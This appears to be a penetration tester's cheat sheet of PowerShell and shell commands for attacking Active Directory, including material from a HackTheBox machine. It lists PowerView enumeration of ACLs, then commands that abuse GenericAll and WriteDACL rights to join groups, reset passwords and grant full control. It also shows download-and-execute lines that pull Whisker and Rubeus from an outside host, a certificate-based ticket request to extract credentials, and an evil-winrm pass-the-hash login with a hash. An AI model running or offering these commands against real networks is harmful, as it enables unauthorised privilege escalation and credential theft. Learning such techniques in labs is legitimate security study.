. .\powerview.ps1

Get-ObjectAcl -Identity offsec

#The output tells us that the AD object identified which is difficult to read. ConvertFrom-SID method, can be useful to convert the SID in plain text


# one convertion
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-553

#dynamic convertion for a user and its group 
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}

#enumerate all ACEs for all domain users
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} 

#enumerate all ACEs for current user
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

#Abusing GenericAll access rights 

#CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com ActiveDirectoryRights : GenericAll
#This means the user has full access to the TestGroup group, we can compromise the group by simply adding ourselves to it:

net group testgroup offsec /add /domain

#CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com
#ActiveDirectoryRights : GenericAll

#This misconfiguration can be used to change testservice2 user password as followed

net user testservice2 newP@44w0rd /domain

#Abusing WriteDACL
WriteDACL grants permission to modify the DACL itself
Considering the following output

#ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com
#ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl

#The output reveals that our current user has WriteDACL access rights to the TestService2 user, which allows us to add new access rights like GenericAll.
#We can use the Add-DomainObjectAcl PowerView method to apply additional access rights such as GenericAll, GenericWrite, or even DCSync1 if the targeted object is the domain object.

Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All


#Abusing AddKeyCredentialLink
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8:9000/Invoke-Whisker.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8:9000/Invoke-Rubeus.ps1')

Invoke-Whisker "add /target:sflowers"

Invoke-Rubeus "asktgt /user:sflowers /certificate:/ynECfgqYf1e... /password:Passwied  /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show"

evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5



